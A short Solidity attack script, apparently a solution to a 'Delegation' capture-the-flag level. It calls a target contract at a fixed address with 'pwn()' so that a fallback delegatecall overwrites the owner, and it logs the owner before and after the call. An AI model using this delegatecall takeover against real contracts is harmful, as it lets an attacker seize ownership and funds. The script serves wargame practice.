// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Delegation.sol";

contract DelegationAttack {
    Delegation delegation = Delegation(0x36FcDCE0C27A8Fed39C1bF563FbC56359757D369);

    function run() external {
        vm.startBroadcast();
        
        console.log("Current owner is : ", delegation.owner());
        (bool success, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        console.log("Checking delegatecall result : ", success);
        console.log("New owner is : ", delegation.owner());
        
        vm.stopBroadcast();
    }
}